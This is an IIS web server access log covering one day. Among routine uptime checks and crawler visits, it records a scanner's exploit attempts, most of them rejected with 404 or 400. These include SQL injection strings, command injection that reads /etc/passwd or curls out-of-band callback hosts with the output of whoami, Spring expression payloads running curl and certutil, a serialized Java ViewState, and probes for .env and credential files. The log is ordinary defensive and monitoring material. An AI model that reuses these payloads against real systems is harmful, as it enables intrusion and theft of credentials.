@@ -1,0 +1,236 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 00:09:08
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 00:09:08 10.3.0.63 POST /cgi-bin/webconfig page=upload_ringtone&action=submit&section=0&conn=0 443 - 67.211.221.139 Mozilla/5.0+(Kubuntu;+Linux+i686)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/133.0.0.0+Safari/537.36 - 404 0 2 3102 650 74
+2026-06-08 00:09:08 10.3.0.63 POST /cgi-bin/webconfig page=upload_ringtone&action=submit&section=1&conn=0 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/113.0.0.0+Safari/537.36 - 404 0 2 3102 642 63
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 00:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 00:35:01 10.3.0.63 GET / - 443 - 54.67.149.244 - - 200 0 0 10280 65 1
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 01:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 01:35:02 10.3.0.63 GET / - 443 - 13.57.227.230 - - 200 0 0 10280 65 55
+2026-06-08 01:44:39 10.3.0.63 GET /robots.txt - 443 - 13.223.141.79 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_10_1)+AppleWebKit/600.2.5+(KHTML,+like+Gecko)+Version/8.0.2+Safari/600.2.5+(Gort) - 200 0 0 2135 238 59
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 02:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 02:35:00 10.3.0.63 GET / - 443 - 18.145.77.29 - - 200 0 0 10280 65 44
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 03:35:03
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 03:35:02 10.3.0.63 GET / - 443 - 204.236.171.237 - - 200 0 0 10280 65 38
+2026-06-08 03:50:27 10.3.0.63 GET /robots.txt - 443 - 104.210.140.132 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/131.0.0.0+Safari/537.36;+compatible;+OAI-SearchBot/1.0;++https://openai.com/searchbot - 200 0 0 143 438 38
+2026-06-08 03:58:10 10.3.0.63 GET /robots.txt - 443 - 66.249.79.227 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 200 0 0 2116 231 30
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 04:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 04:35:01 10.3.0.63 GET / - 443 - 18.144.255.37 - - 200 0 0 10280 65 1
+2026-06-08 04:41:45 10.3.0.63 GET /robots.txt - 443 - 173.252.70.11 facebookexternalhit/1.1+(+http://www.facebook.com/externalhit_uatext.php) - 200 0 0 26 208 62
+2026-06-08 04:52:07 10.3.0.63 GET /console/login/LoginForm.jsp - 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+i686)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/137.0.0.0+Safari/537.36 - 404 0 2 3102 257 73
+2026-06-08 05:05:47 10.3.0.63 GET /hystrix/;a=a/__${T+(java.lang.Runtime).getRuntime().exec("curl+http:/d8dhhi5sk7suikvi1lc0grgi99k9dpdf9.oast.fun")}__::.x/ - 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.3+Mobile/15E148+Safari/604.1 - 400 0 0 5417 405 77
+2026-06-08 05:05:47 10.3.0.63 GET /hystrix/;a=a/__${T+(java.lang.Runtime).getRuntime().exec("certutil+-urlcache+-split+-f+http:/d8dhhi5sk7suikvi1lc0dzwjusng3tot3.oast.fun")}__::.x/ - 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/18.0+Safari/605.1.15 - 400 0 0 5417 424 63
+2026-06-08 05:08:35 10.3.0.63 GET /module/smartblog/archive month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- 443 - 67.211.221.139 Mozilla/5.0+(Fedora;+Linux+i686)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/135.0.0.0+Safari/537.36 - 404 0 2 3102 441 63
+2026-06-08 05:13:13 10.3.0.63 GET /wp-admin/admin-ajax.php action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/136.0.0.0+Safari/537.36 - 404 0 2 3102 323 62
+2026-06-08 05:18:39 10.3.0.63 GET /index.php option=com_prayercenter&task=confirm&id=1&sessionid=1'+AND+EXTRACTVALUE(22,CONCAT(0x7e,md5(885948447)))--+X 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/108.0.0.0+Safari/537.36 - 404 0 2 3102 365 64
+2026-06-08 05:20:57 10.3.0.63 GET /connectioncheck.php ip=127.0.0.1%20%26%26%20curl%20http%3A%2F%2F%24(whoami).d8dhhi5sk7suikvi1lc04ippyw7t5zrnq.oast.fun 443 - 67.211.221.139 Mozilla/5.0+(ZZ;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/138.0.0.0+Safari/537.36 - 404 0 2 3102 349 62
+2026-06-08 05:26:31 10.3.0.63 GET /duomiphp/ajax.php action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(999999999))) 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.6.1+Mobile/15E148+Safari/604.1 - 404 0 2 3102 357 75
+2026-06-08 05:26:32 10.3.0.63 GET /cgi-bin/db_eventlog_w.cgi date_start=0&date_end=1715630160&gravity=%25&type=%25%27and/**/%271%27=%271 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.2+Mobile/15E148+Safari/604.1 - 404 0 2 3102 360 74
+2026-06-08 05:29:00 10.3.0.63 GET /a/sys/user/resetPassword mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(999999999)),0x7e),1))%23 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/14.0.3+Safari/605.1.15 - 404 0 2 3102 365 74
+2026-06-08 05:30:11 10.3.0.63 GET /mobile/plugin/SyncUserInfo.jsp userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null 443 - 67.211.221.139 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:84.0)+Gecko/20100101+Firefox/84.0 - 404 0 2 3102 319 64
+2026-06-08 05:30:11 10.3.0.63 GET /api/sms_check.php param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5(999999999)),0x7e),1)--%20 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+13_1)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.1+Safari/605.1.15 - 404 0 2 3102 345 65
+2026-06-08 05:31:26 10.3.0.63 GET /co/programs/income_support/housing/program2.htm - 443 - 154.240.109.141 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/91.0.4472.101+Safari/537.36 - 200 0 0 20439 281 433
+2026-06-08 05:35:01 10.3.0.63 GET / - 443 - 54.215.141.84 - - 200 0 0 10280 65 61
+2026-06-08 05:43:19 10.3.0.63 GET /index.htm - 443 - 103.204.208.203 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_7_3)+AppleWebKit/537.36+(KHTML,+like+Gecko,+Mediapartners-Google)+Chrome/83.0.4103.118+Safari/537.36 - 200 0 0 5400 275 229
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 06:23:10
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 06:23:10 10.3.0.63 GET /tag_test_action.php url=a&token&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5%28%22CVE-2018-7700%22%29%3B{/dede:field} 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+x86_64;+rv:1.9.5.20)+Gecko/+Firefox/13.0 - 404 0 2 3102 338 62
+2026-06-08 06:32:55 10.3.0.63 GET /res/login.jsf javax.faces.ViewState=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAKmQ4ZGhoaTVzazdzdWlrdmkxbGMwaDhyaW1rbmE5a29wMS5vYXN0LmZ1bnQAAHEAfgAFdAAEaHR0cHB4dAAxaHR0cDovL2Q4ZGhoaTVzazdzdWlrdmkxbGMwaDhyaW1rbmE5a29wMS5vYXN0LmZ1bng= 443 - 67.211.221.139 Mozilla/5.0+(Windows+NT+6.1;+Win64;+x64;+rv:47.0)+Gecko/20100101+Firefox/47.0 - 404 0 2 3102 692 73
+2026-06-08 06:32:55 10.3.0.63 GET /install/lib/ajaxHandlers/ajaxServerSettingsChk.php rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_6_8)+AppleWebKit/534.59.10+(KHTML,+like+Gecko)+Version/5.1.9+Safari/534.59.10 - 404 0 2 3102 365 74
+2026-06-08 06:34:10 10.3.0.63 GET /service.pdfs/confluence lang=en&file=`curl+d8dhhi5sk7suikvi1lc0u8aawfh8y5yhr.oast.fun` 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+i686;+rv:1.9.7.20)+Gecko/+Firefox/3.6.10 - 404 0 2 3102 281 73
+2026-06-08 06:34:10 10.3.0.63 GET /cgi-bin/;cat$IFS/etc/passwd - 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/16.2+Safari/537.36 - 404 0 2 3102 271 74
+2026-06-08 06:34:10 10.3.0.63 GET / PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+- 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_9_5)+AppleWebKit/600.1.17+(KHTML,+like+Gecko)+Version/7.1+Safari/537.85.10 - 200 0 0 5417 367 75
+2026-06-08 06:35:02 10.3.0.63 GET / - 443 - 18.145.38.163 - - 200 0 0 10280 65 43
+2026-06-08 06:40:12 10.3.0.63 GET /index.php q=category&search=Banking%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,md5(999999999),15,16,17,18,19--+ 443 - 67.211.221.139 Mozilla/5.0+(X11;+Ubuntu;+Linux+aarch64;+rv:90.0)+Gecko/20100101+Firefox/90.0 - 404 0 2 3102 328 62
+2026-06-08 06:40:12 10.3.0.63 GET /nagiosql/admin/info.php key1=%27%20union%20select%20concat(md5(2099253582))%23 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_3)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/13.0.5+Safari/605.1.15 - 404 0 2 3102 328 73
+2026-06-08 06:40:12 10.3.0.63 GET /jsrpc.php type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0):: 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+13_0)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.1+Safari/605.1.15 - 404 0 2 3102 376 73
+2026-06-08 06:40:12 10.3.0.63 GET /api/v1/confup mode&uid=1'%20UNION%20select%201,2,3,4,sqlite_version();-- 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+13_6)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.6+Safari/605.1.15 - 404 0 2 3102 317 74
+2026-06-08 06:51:58 10.3.0.63 GET /web.config.i18n.ashx l=jnzpp&v=jnzpp 443 - 67.211.221.139 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 0 3856 245 64
+2026-06-08 06:51:58 10.3.0.63 GET /SWNetPerfMon.db.i18n.ashx l=jnzpp&v=jnzpp 443 - 67.211.221.139 Mozilla/5.0+(ZZ;+Linux+i686)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/136.0.0.0+Safari/537.36 - 404 0 0 3861 270 63
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 07:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 07:35:01 10.3.0.63 GET / - 443 - 54.219.156.187 - - 200 0 0 10280 65 1
+2026-06-08 07:42:57 10.3.0.63 GET /co/situations/youthanddisability/benefitsforyoungpeople/program2h.htm - 443 - 47.79.11.65 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/138.0.0.0+Safari/537.36 - 200 0 0 20821 756 1517
+2026-06-08 07:55:49 10.3.0.63 GET /command.cgi cat%20/etc/passwd 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+i686;+rv:1.9.5.20)+Gecko/+Firefox/3.6.16 - 404 0 2 3102 224 64
+2026-06-08 07:55:49 10.3.0.63 GET /plus/ajax_common.php act=hotword&query=aa%%e9%8c%a6%27%20union%20select%201,md5(999999999),3%23%27 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/13.0.1+Safari/605.1.15 - 404 0 2 3102 346 62
+2026-06-08 07:55:49 10.3.0.63 GET /cgi-bin/login_mgr.cgi C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+x86_64;+rv:1.9.6.20)+Gecko/+Firefox/3.6.14 - 404 0 2 3102 323 74
+2026-06-08 07:55:49 10.3.0.63 GET /modules/bamegamenu/ajax_phpcode.php code=print(md5(999999999)) 443 - 67.211.221.139 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/116.0.0.0+Safari/537.36 - 404 0 2 3102 294 62
+2026-06-08 07:55:49 10.3.0.63 GET /api/v1/repos/search q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27 443 - 67.211.221.139 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/79.0.3945.130+Safari/537.36 - 404 0 2 3102 1219 74
+2026-06-08 07:55:49 10.3.0.63 GET /pages/systemcall.php command=cat%20/etc/passwd 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/14.1.2+Safari/605.1.15 - 404 0 2 3102 296 74
+2026-06-08 07:55:49 10.3.0.63 GET /wp-json/h5vp/v1/video/0 id='+union+all+select+concat(0x64617461626173653a,1,0x7c76657273696f6e3a,2,0x7c757365723a,md5(999999999)),2,3,4,5,6,7,8--+- 443 - 67.211.221.139 Mozilla/5.0+(Windows+NT+6.1;+Win64;+x64;+rv:109.0)+Gecko/20100101+Firefox/115.0 - 404 0 2 3102 357 63
+2026-06-08 07:55:49 10.3.0.63 GET /oauth/authorize response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/17.0+Safari/605.4.21 - 404 0 2 3102 345 74
+2026-06-08 07:55:50 10.3.0.63 GET /commands.inc.php searchOption=contains&searchField=vuln&search=search&searchColumn=command%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,md5('999999999'),0x5B50574E5D3C42523E)%20limit%200,1),NULL-- 443 - 67.211.221.139 Mozilla/5.0+(ZZ;+Linux+i686)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/134.0.0.0+Safari/537.36 - 404 0 2 3102 447 62
+2026-06-08 08:06:26 10.3.0.63 GET /xwiki/bin/get/Main/DatabaseSearch outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 443 - 67.211.221.139 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/14.0.3+Safari/605.1.15 - 404 8 0 3102 505 63
+2026-06-08 08:06:26 10.3.0.63 GET /bin/get/Main/DatabaseSearch outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 443 - 67.211.221.139 Mozilla/5.0+(watchTowr;+Windows+NT+10.0;+Win64;+x64;+rv:84.0)+Gecko/20100101+Firefox/84.0 - 404 8 0 3102 469 63
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 08:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 08:35:01 10.3.0.63 GET / - 443 - 184.169.217.213 - - 200 0 0 10280 65 18
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 09:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 09:35:01 10.3.0.63 GET / - 443 - 54.176.19.53 - - 200 0 0 10280 65 3
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 10:20:54
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 10:20:54 10.3.0.63 GET / - 80 - 104.198.110.98 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:109.0)+Gecko/20100101+Firefox/118.0 - 302 0 0 1966 280 23
+2026-06-08 10:20:54 10.3.0.63 GET / - 443 - 104.198.110.98 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:109.0)+Gecko/20100101+Firefox/118.0 - 200 0 0 3425 287 32
+2026-06-08 10:20:54 10.3.0.63 GET /favicon.ico - 80 - 104.198.110.98 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:109.0)+Gecko/20100101+Firefox/118.0 - 302 0 0 1988 291 24
+2026-06-08 10:20:54 10.3.0.63 GET /apple-touch-icon.png - 443 - 104.198.110.98 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:109.0)+Gecko/20100101+Firefox/118.0 - 200 0 0 6108 307 25
+2026-06-08 10:35:01 10.3.0.63 GET / - 443 - 13.57.16.48 - - 200 0 0 10280 65 4
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 11:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 11:35:00 10.3.0.63 GET / - 443 - 13.57.16.48 - - 200 0 0 10280 65 38
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 12:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 12:35:01 10.3.0.63 GET / - 443 - 54.193.6.162 - - 200 0 0 10280 65 1
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 12:55:37
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 12:55:37 10.3.0.63 GET / - 443 - 178.16.54.246 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36 - 200 0 0 5398 184 308
+2026-06-08 12:56:32 10.3.0.63 GET /dist/js/master.bundle.min.js - 443 - 178.16.54.246 python-httpx/0.28.1 - 200 0 0 519285 171 55311
+2026-06-08 12:57:00 10.3.0.63 GET /dist/js/master.bundle.min.js.map - 443 - 178.16.54.246 python-httpx/0.28.1 - 500 19 64 400494 175 25212
+2026-06-08 12:57:01 10.3.0.63 GET /jss/efw.logon2.services.js - 443 - 178.16.54.246 python-httpx/0.28.1 - 200 0 0 2277 169 291
+2026-06-08 12:57:06 10.3.0.63 GET /.env - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 147 202
+2026-06-08 12:57:09 10.3.0.63 GET /.env.local - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 153 2317
+2026-06-08 12:57:10 10.3.0.63 GET /.env.production - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 158 225
+2026-06-08 12:57:15 10.3.0.63 GET /.env.development - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 159 3966
+2026-06-08 12:57:17 10.3.0.63 GET /.env.staging - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 210
+2026-06-08 12:57:18 10.3.0.63 GET /.env.test - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 152 1061
+2026-06-08 12:57:19 10.3.0.63 GET /.env.backup - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 154 383
+2026-06-08 12:57:20 10.3.0.63 GET /config.json - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 154 214
+2026-06-08 12:57:22 10.3.0.63 GET /config.js - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 152 260
+2026-06-08 12:57:22 10.3.0.63 GET /settings.json - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 156 305
+2026-06-08 12:57:23 10.3.0.63 GET /secrets.json - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 207
+2026-06-08 12:57:25 10.3.0.63 GET /credentials.json - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 159 397
+2026-06-08 12:57:25 10.3.0.63 GET /database.yml - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 225
+2026-06-08 12:57:26 10.3.0.63 GET /backup.sql - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 153 233
+2026-06-08 12:57:28 10.3.0.63 GET /dump.sql - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 151 263
+2026-06-08 12:57:28 10.3.0.63 GET /db.sql - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 149 218
+2026-06-08 12:57:29 10.3.0.63 GET /database.sql - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 218
+2026-06-08 12:57:30 10.3.0.63 GET /backup.bak - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 153 232
+2026-06-08 12:57:31 10.3.0.63 GET /dump.bak - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 151 226
+2026-06-08 12:57:31 10.3.0.63 GET /db.bak - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 149 196
+2026-06-08 12:57:33 10.3.0.63 GET /swagger.json - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 218
+2026-06-08 12:57:33 10.3.0.63 GET /swagger.yaml - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 219
+2026-06-08 12:57:34 10.3.0.63 GET /openapi.json - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 206
+2026-06-08 12:57:35 10.3.0.63 GET /api-docs - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 151 198
+2026-06-08 12:57:37 10.3.0.63 GET /v1/api-docs - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 154 260
+2026-06-08 12:57:38 10.3.0.63 GET /v2/api-docs - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 154 198
+2026-06-08 12:57:38 10.3.0.63 GET /debug - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 148 219
+2026-06-08 12:57:39 10.3.0.63 GET /actuator/env - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 155 228
+2026-06-08 12:57:40 10.3.0.63 GET /actuator/configprops - 443 - 178.16.54.246 python-httpx/0.28.1 - 404 0 2 3083 163 196
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 13:26:26
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 13:26:25 10.3.0.63 GET / - 443 - 71.6.134.237 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/133.0.0.0+Safari/537.36 - 200 0 0 5398 202 16
